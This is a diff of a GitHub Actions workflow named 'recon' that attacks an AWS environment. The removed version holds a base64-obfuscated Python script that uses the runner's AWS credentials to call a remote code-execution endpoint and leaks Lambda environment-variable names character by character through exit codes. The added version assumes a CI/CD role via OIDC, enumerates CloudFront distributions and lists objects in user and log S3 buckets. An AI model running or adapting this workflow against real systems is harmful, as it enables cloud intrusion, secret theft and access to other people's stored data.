@@ -7,23 +7,37 @@ on:
 
 permissions:
   contents: read
+  id-token: write
 
 jobs:
   recon:
     runs-on: ubuntu-latest
 
-    env:
-      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
-      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
-      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
-      AWS_DEFAULT_REGION: us-east-1
-
     steps:
-      - name: Extract remaining Lambda environment names
+      - name: Assume CICD role through GitHub OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::121774052880:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Verify assumed role
         run: |
-          pip install boto3 requests requests-aws4auth --quiet
+          aws sts get-caller-identity
 
-          B64='aW1wb3J0IGJhc2U2NCwgcmUsIHJlcXVlc3RzLCBib3RvMwpmcm9tIHJlcXVlc3RzX2F3czRhdXRoIGltcG9ydCBBV1M0QXV0aApBUEk9Imh0dHBzOi8vbDhzc3lhejY5Zi5leGVjdXRlLWFwaS51cy1lYXN0LTEuYW1hem9uYXdzLmNvbS9kZXYvY29kZV9leGVjIgpjcmVkcz1ib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGg9QVdTNEF1dGgoY3JlZHMuYWNjZXNzX2tleSxjcmVkcy5zZWNyZXRfa2V5LCJ1cy1lYXN0LTEiLCJleGVjdXRlLWFwaSIsc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKb3V0PVtdCmZvciBpbmRleCBpbiByYW5nZSgyNTYsNTEyKToKICAgIGNvZGU9ZiIiImltcG9ydCBvcwpuYW1lcz0iLCIuam9pbihzb3J0ZWQoW2tleSBmb3Iga2V5IGluIG9zLmVudmlyb24gaWYgYW55KHdvcmQgaW4ga2V5LnVwcGVyKCkgZm9yIHdvcmQgaW4gW1wiVlBDXCIsXCJFTkRQT0lOVFwiLFwiUzNcIixcIkJVQ0tFVFwiLFwiQ0xPVURcIixcIlJFR0lPTlwiLFwiTEFNQkRBXCIsXCJBV1NfXCJdKV0pKQppZiB7aW5kZXh9ID49IGxlbihuYW1lcyk6IHJhaXNlIFN5c3RlbUV4aXQoMjU1KQpyYWlzZSBTeXN0ZW1FeGl0KG9yZChuYW1lc1t7aW5kZXh9XSkpCiIiIgogICAgZW5jPWJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCkKICAgIHI9cmVxdWVzdHMucG9zdChBUEksanNvbj17ImNvZGUiOmVuY30sYXV0aD1hdXRoLHRpbWVvdXQ9MzApCiAgICBtPXJlLnNlYXJjaChyImV4aXQgc3RhdHVzIChcZCspIixyLnRleHQpCiAgICBpZiBub3QgbTogcHJpbnQoIk5PX0VYSVRfQ09ERSIsaW5kZXgsci50ZXh0KTsgYnJlYWsKICAgIG49aW50KG0uZ3JvdXAoMSkpCiAgICBpZiBuPT0yNTU6IGJyZWFrCiAgICBvdXQuYXBwZW5kKGNocihuKSkKcHJpbnQoIkxBTUJEQV9FTlZfTkFNRVNfU1VGRklYOiIpCnByaW50KCIiLmpvaW4ob3V0KSkK'
+      - name: Enumerate CloudFront distributions
+        run: |
+          aws cloudfront list-distributions \
+            --query 'DistributionList.Items[].{Id:Id,Domain:DomainName,Origins:Origins.Items[].DomainName}' \
+            --output json
 
-          printf '%s' "$B64" | base64 -d > /tmp/extract_suffix.py
-          python3 /tmp/extract_suffix.py
+      - name: Test bucket access
+        run: |
+          aws s3api list-objects-v2 \
+            --bucket userad88e2b168aa387e \
+            --max-items 5 \
+            --output json
+
+          aws s3api list-objects-v2 \
+            --bucket logad88e2b168aa387e \
+            --max-items 5 \
+            --output json
